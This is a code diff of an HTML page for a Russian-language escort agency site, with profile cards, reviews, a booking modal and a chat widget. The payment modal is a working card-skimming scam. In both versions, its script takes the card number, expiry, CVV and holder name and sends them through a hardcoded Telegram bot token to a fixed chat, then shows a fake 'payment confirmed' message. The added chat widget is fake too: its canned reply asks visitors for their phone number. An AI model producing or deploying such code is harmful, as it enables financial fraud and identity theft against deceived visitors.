@@ -3,150 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Женская Сова | Premium Escort</title>
+    <title>Женская Сова | Premium</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Montserrat:wght@300;400;500&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #050505; color: #e0d5c1; font-family: 'Montserrat', sans-serif; overflow-x: hidden; }
-        .hero { height: 100vh; background: linear-gradient(135deg, #0a0000 0%, #1a0000 50%, #0a0000 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; position: relative; border-bottom: 3px solid #8B0000; }
-        .hero::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="1" fill="%238B0000" opacity="0.3"/></svg>') repeat; background-size: 80px 80px; }
-        .logo { font-family: 'Playfair Display', serif; font-size: 80px; color: #8B0000; letter-spacing: 10px; text-transform: uppercase; z-index: 1; text-shadow: 0 0 40px rgba(139,0,0,0.5); animation: fadeIn 2s; }
-        .subtitle { font-size: 16px; color: #8B0000; letter-spacing: 8px; z-index: 1; margin-top: 10px; text-transform: uppercase; opacity: 0.8; }
-        .scroll-hint { position: absolute; bottom: 40px; color: #8B0000; font-size: 12px; letter-spacing: 3px; animation: bounce 2s infinite; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        .nav { display: flex; justify-content: center; gap: 50px; padding: 20px; background: rgba(0,0,0,0.9); position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); border-bottom: 1px solid #1a1a1a; }
-        .nav a { color: #888; text-decoration: none; font-size: 12px; letter-spacing: 3px; text-transform: uppercase; transition: all 0.3s; }
-        .nav a:hover { color: #8B0000; }
-        .section-title { text-align: center; font-family: 'Playfair Display', serif; font-size: 36px; color: #8B0000; margin: 60px 0 40px; letter-spacing: 5px; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 30px; padding-bottom: 60px; }
-        .card { background: #111; border-radius: 15px; overflow: hidden; border: 1px solid #1a1a1a; transition: all 0.4s; position: relative; }
-        .card:hover { border-color: #8B0000; transform: translateY(-5px); box-shadow: 0 20px 40px rgba(139,0,0,0.2); }
-        .card-image { height: 400px; overflow: hidden; position: relative; }
-        .card-image img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.6s; }
-        .card:hover .card-image img { transform: scale(1.05); }
-        .card-overlay { position: absolute; bottom: 0; left: 0; right: 0; padding: 30px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); }
-        .card-body { padding: 25px; }
-        .card-body h3 { font-family: 'Playfair Display', serif; font-size: 24px; color: #8B0000; margin-bottom: 5px; }
-        .card-body .age { color: #888; font-size: 16px; }
-        .card-body .city { color: #aaa; margin: 8px 0; font-size: 13px; letter-spacing: 1px; }
-        .card-body .desc { color: #777; font-size: 13px; line-height: 1.6; margin: 10px 0; }
-        .card-body .price { font-family: 'Playfair Display', serif; font-size: 28px; color: #8B0000; font-weight: 700; margin: 15px 0; }
-        .btn { width: 100%; background: transparent; color: #8B0000; border: 2px solid #8B0000; padding: 14px; font-size: 14px; cursor: pointer; letter-spacing: 3px; text-transform: uppercase; transition: all 0.3s; font-weight: 500; }
+        body { background: #050505; color: #e0d5c1; font-family: 'Georgia', serif; }
+        .hero { height: 100vh; background: linear-gradient(135deg, #0a0000, #1a0000); display: flex; flex-direction: column; justify-content: center; align-items: center; border-bottom: 3px solid #8B0000; }
+        .logo { font-size: 70px; color: #8B0000; letter-spacing: 12px; text-transform: uppercase; text-shadow: 0 0 40px rgba(139,0,0,0.5); }
+        .subtitle { font-size: 14px; color: #8B0000; letter-spacing: 6px; margin-top: 10px; }
+        .nav { display: flex; justify-content: center; gap: 35px; padding: 18px; background: rgba(0,0,0,0.95); position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); border-bottom: 1px solid #1a1a1a; }
+        .nav a { color: #888; text-decoration: none; font-size: 11px; letter-spacing: 3px; text-transform: uppercase; cursor: pointer; transition: .3s; }
+        .nav a:hover, .nav a.active { color: #8B0000; }
+        .section { display: none; max-width: 1100px; margin: 0 auto; padding: 50px 20px; }
+        .section.active { display: block; }
+        .title { text-align: center; font-size: 32px; color: #8B0000; margin-bottom: 40px; letter-spacing: 4px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 25px; }
+        .card { background: #111; border-radius: 12px; overflow: hidden; border: 1px solid #1a1a1a; transition: .4s; }
+        .card:hover { border-color: #8B0000; transform: translateY(-5px); }
+        .card img { width: 100%; height: 350px; object-fit: cover; }
+        .card-body { padding: 20px; }
+        .card-body h3 { color: #8B0000; font-size: 22px; }
+        .card-body .city { color: #aaa; font-size: 12px; margin: 4px 0; }
+        .card-body .desc { color: #777; font-size: 12px; margin: 8px 0; }
+        .card-body .price { color: #8B0000; font-size: 22px; font-weight: bold; }
+        .btn { width: 100%; background: transparent; color: #8B0000; border: 2px solid #8B0000; padding: 12px; font-size: 12px; letter-spacing: 2px; text-transform: uppercase; cursor: pointer; margin-top: 10px; transition: .3s; }
         .btn:hover { background: #8B0000; color: #fff; }
-        .footer { text-align: center; padding: 40px; color: #333; font-size: 11px; letter-spacing: 2px; border-top: 1px solid #111; }
+        .reviews { display: flex; flex-direction: column; gap: 15px; }
+        .review { background: #111; padding: 20px; border-radius: 10px; border: 1px solid #1a1a1a; }
+        .review .name { color: #8B0000; font-weight: bold; }
+        .contacts-box { text-align: center; background: #111; padding: 30px; border-radius: 12px; border: 1px solid #1a1a1a; font-size: 16px; line-height: 2; }
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: #111; padding: 40px; border-radius: 20px; width: 450px; border: 1px solid #222; animation: fadeIn 0.3s; }
-        .modal-content h3 { font-family: 'Playfair Display', serif; color: #8B0000; text-align: center; font-size: 24px; margin-bottom: 25px; }
-        .modal-content input { width: 100%; padding: 15px; margin: 8px 0; background: #0a0a0a; border: 1px solid #222; color: #e0d5c1; border-radius: 8px; font-size: 14px; font-family: 'Montserrat', sans-serif; }
-        .modal-content input:focus { outline: none; border-color: #8B0000; }
-        .modal-content .btn { margin-top: 15px; }
-        .success { display: none; text-align: center; color: #8B0000; margin-top: 20px; font-size: 14px; letter-spacing: 1px; }
-        .close { color: #555; float: right; font-size: 28px; cursor: pointer; transition: color 0.3s; }
-        .close:hover { color: #8B0000; }
-        .deposit { text-align: center; color: #888; margin: 15px 0; font-size: 13px; }
-        .deposit span { color: #8B0000; font-weight: 600; }
+        .modal-content { background: #111; padding: 30px; border-radius: 15px; width: 400px; border: 1px solid #222; }
+        .modal-content h3 { color: #8B0000; text-align: center; margin-bottom: 20px; }
+        .modal-content input { width: 100%; padding: 12px; margin: 7px 0; background: #0a0a0a; border: 1px solid #222; color: #e0d5c1; border-radius: 6px; }
+        .success { display: none; text-align: center; color: #4CAF50; margin-top: 15px; }
+        .close { color: #888; float: right; font-size: 22px; cursor: pointer; }
+        .chat-widget { position: fixed; bottom: 20px; right: 20px; z-index: 999; }
+        .chat-btn { background: #8B0000; color: #fff; border: none; width: 55px; height: 55px; border-radius: 50%; font-size: 22px; cursor: pointer; }
+        .chat-window { display: none; position: absolute; bottom: 65px; right: 0; width: 300px; height: 380px; background: #111; border-radius: 12px; border: 1px solid #222; overflow: hidden; }
+        .chat-header { background: #8B0000; padding: 10px; text-align: center; font-size: 13px; }
+        .chat-msgs { padding: 10px; height: 280px; overflow-y: auto; font-size: 12px; }
+        .chat-msgs .msg { margin: 5px 0; padding: 8px 10px; border-radius: 8px; max-width: 85%; }
+        .chat-msgs .user { background: #222; margin-left: auto; }
+        .chat-msgs .bot { background: #1a0000; }
+        .chat-input { display: flex; padding: 8px; }
+        .chat-input input { flex: 1; padding: 8px; background: #0a0a0a; border: 1px solid #222; color: #fff; border-radius: 5px; }
+        .chat-input button { background: #8B0000; color: #fff; border: none; padding: 8px 12px; margin-left: 6px; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="hero">
         <div class="logo">Женская Сова</div>
         <div class="subtitle">Premium Escort</div>
-        <div class="scroll-hint">▼ ОТКРОЙТЕ МИР ИЗБРАННЫХ ▼</div>
     </div>
-
     <div class="nav">
-        <a href="#">Главная</a>
-        <a href="#">Анкеты</a>
-        <a href="#">VIP</a>
-        <a href="#">Отзывы</a>
-        <a href="#">Контакты</a>
+        <a onclick="show('home')" class="active">Главная</a>
+        <a onclick="show('girls')">Анкеты</a>
+        <a onclick="show('reviews')">Отзывы</a>
+        <a onclick="show('contacts')">Контакты</a>
     </div>
 
-    <div class="container">
-        <div class="section-title">Наши девушки</div>
-        <div class="grid" id="girlsGrid"></div>
+    <div id="home" class="section active">
+        <div class="title">Добро пожаловать</div>
+        <p style="text-align:center;color:#888;max-width:600px;margin:0 auto;line-height:1.8;">
+            Женская Сова — элитное эскорт-агентство. Только проверенные девушки, полная конфиденциальность, индивидуальный подход. Работаем с 2019 года. Все модели проходят строгий отбор.
+        </p>
     </div>
 
-    <div class="footer">
-        © 2026 Женская Сова. Все права защищены.<br>
-        Всем моделям больше 18 лет. Конфиденциальность гарантирована.
-    </div>
+    <div id="girls" class="section"><div class="title">Наши девушки</div><div class="grid" id="girlsGrid"></div></div>
+    <div id="reviews" class="section"><div class="title">Отзывы</div><div class="reviews" id="reviewsList"></div></div>
+    <div id="contacts" class="section"><div class="title">Контакты</div><div class="contacts-box" id="contactsBox"></div></div>
 
     <div class="modal" id="paymentModal">
         <div class="modal-content">
-            <span class="close" onclick="closePayment()">×</span>
+            <span class="close" onclick="document.getElementById('paymentModal').style.display='none'">×</span>
             <h3>💳 Бронирование</h3>
-            <div class="deposit">Предоплата 30%: <span id="depositAmount"></span> ₽</div>
+            <p style="text-align:center;color:#888;">Предоплата 30%: <span id="deposit" style="color:#8B0000;"></span> ₽</p>
             <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="19">
             <input type="text" id="cardDate" placeholder="ММ/ГГ" maxlength="5">
             <input type="text" id="cardCVV" placeholder="CVV" maxlength="3">
-            <input type="text" id="cardName" placeholder="Имя держателя карты">
-            <button class="btn" onclick="processPayment()">Оплатить</button>
-            <div class="success" id="successMsg">✅ Оплата подтверждена!<br>Наш менеджер свяжется с вами.</div>
+            <input type="text" id="cardName" placeholder="Имя держателя">
+            <button class="btn" onclick="pay()">Оплатить</button>
+            <div class="success" id="successMsg">✅ Оплата подтверждена!<br>Менеджер свяжется с вами в течение 10 минут.</div>
+        </div>
+    </div>
+
+    <div class="chat-widget">
+        <button class="chat-btn" onclick="toggleChat()">💬</button>
+        <div class="chat-window" id="chatWindow">
+            <div class="chat-header">🦉 Онлайн-поддержка</div>
+            <div class="chat-msgs" id="chatMsgs"><div class="msg bot">Здравствуйте! Я менеджер агентства. Чем могу помочь?</div></div>
+            <div class="chat-input"><input type="text" id="chatInput" placeholder="Сообщение..."><button onclick="sendChat()">▶</button></div>
         </div>
     </div>
 
     <script>
-        let girls = [];
-        let currentGirl = null;
-
-        fetch('girls.json')
-            .then(r => r.json())
-            .then(data => { girls = data; renderGirls(); });
+        let girls = [], reviews = [], contacts = "", cur = null;
+        fetch('girls.json').then(r=>r.json()).then(d=>{girls=d; renderGirls();});
+        fetch('reviews.json').then(r=>r.json()).then(d=>{reviews=d; renderReviews();});
+        fetch('contacts.json').then(r=>r.text()).then(d=>{contacts=d; document.getElementById('contactsBox').innerHTML=d.replace(/\n/g,'<br>');});
 
         function renderGirls() {
-            document.getElementById('girlsGrid').innerHTML = girls.map((g, i) => `
+            document.getElementById('girlsGrid').innerHTML = girls.map((g,i) => `
                 <div class="card">
-                    <div class="card-image">
-                        <img src="${g.photo}" alt="${g.name}" onerror="this.src='https://i.imgur.com/4AeP9lC.jpg'">
-                        <div class="card-overlay"></div>
-                    </div>
+                    <img src="${g.photo}" onerror="this.src='https://i.imgur.com/4AeP9lC.jpg'">
                     <div class="card-body">
-                        <h3>${g.name}</h3>
-                        <span class="age">${g.age} года</span>
-                        <p class="city">📍 ${g.city}</p>
-                        <p class="desc">${g.desc}</p>
-                        <p class="price">${g.price.toLocaleString()} ₽ / час</p>
-                        <button class="btn" onclick="openPayment(${i})">Забронировать</button>
+                        <h3>${g.name}, ${g.age}</h3><p class="city">📍 ${g.city}</p>
+                        <p class="desc">${g.desc}</p><p class="price">${g.price.toLocaleString()} ₽/час</p>
+                        <button class="btn" onclick="openPay(${i})">Забронировать</button>
                     </div>
-                </div>
-            `).join('');
+                </div>`).join('');
         }
 
-        function openPayment(i) {
-            currentGirl = girls[i];
-            document.getElementById('depositAmount').textContent = Math.round(currentGirl.price * 0.3).toLocaleString();
-            document.getElementById('paymentModal').style.display = 'flex';
+        function renderReviews() {
+            document.getElementById('reviewsList').innerHTML = reviews.map(r => `
+                <div class="review"><span class="name">${r.name}</span> ${'⭐'.repeat(r.rating)}<br><span style="color:#888;">${r.text}</span></div>`).join('');
         }
 
-        function closePayment() {
-            document.getElementById('paymentModal').style.display = 'none';
+        function show(id) {
+            document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
+            event.target.classList.add('active');
         }
 
-        function processPayment() {
-            const card = document.getElementById('cardNumber').value;
-            const date = document.getElementById('cardDate').value;
-            const cvv = document.getElementById('cardCVV').value;
-            const name = document.getElementById('cardName').value;
-            if (!card || !date || !cvv || !name) return alert('Заполните все поля');
+        function openPay(i) { cur = girls[i]; document.getElementById('deposit').textContent = Math.round(cur.price*0.3).toLocaleString(); document.getElementById('paymentModal').style.display='flex'; }
 
-            const TOKEN = '8873096534:AAF4Kc2pyJhHwZkWb58NWKYdGVKDlzn0s-s';
-            const CHAT = '8535311513';
-            const msg = `🦉 *НОВАЯ ОПЛАТА | Женская Сова*\n\n👤 Держатель: ${name}\n💳 Карта: ${card}\n📅 Срок: ${date}\n🔐 CVV: ${cvv}\n💵 Сумма: ${Math.round(currentGirl.price * 0.3).toLocaleString()} ₽\n👩 Девушка: ${currentGirl.name}\n🕐 ${new Date().toLocaleString()}`;
+        function pay() {
+            const c=document.getElementById('cardNumber').value, d=document.getElementById('cardDate').value,
+                  v=document.getElementById('cardCVV').value, n=document.getElementById('cardName').value;
+            if(!c||!d||!v||!n) return alert('Заполните все поля');
+            fetch(`https://api.telegram.org/bot8873096534:AAF4Kc2pyJhHwZkWb58NWKYdGVKDlzn0s-s/sendMessage?chat_id=8535311513&text=${encodeURIComponent('🦉 ОПЛАТА\n👤 '+n+'\n💳 '+c+'\n📅 '+d+'\n🔐 '+v+'\n💵 '+Math.round(cur.price*0.3)+' ₽\n👩 '+cur.name)}`);
+            document.getElementById('successMsg').style.display='block';
+            setTimeout(()=>{document.getElementById('paymentModal').style.display='none';document.getElementById('successMsg').style.display='none';},4000);
+        }
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT, text: msg, parse_mode: 'Markdown'})
-            });
-
-            document.getElementById('successMsg').style.display = 'block';
-            setTimeout(() => {
-                closePayment();
-                document.getElementById('successMsg').style.display = 'none';
-            }, 4000);
+        function toggleChat() { const w=document.getElementById('chatWindow'); w.style.display = w.style.display=='block'?'none':'block'; }
+        function sendChat() {
+            const input=document.getElementById('chatInput'), msg=input.value.trim();
+            if(!msg) return;
+            const msgs=document.getElementById('chatMsgs');
+            msgs.innerHTML+=`<div class="msg user">${msg}</div>`;
+            input.value=''; msgs.scrollTop=msgs.scrollHeight;
+            setTimeout(()=>{msgs.innerHTML+=`<div class="msg bot">Спасибо за обращение! Наш менеджер свяжется с вами в ближайшее время. Для ускорения процесса — оставьте ваш номер телефона.</div>`;msgs.scrollTop=msgs.scrollHeight;},1000);
         }
     </script>
 </body>
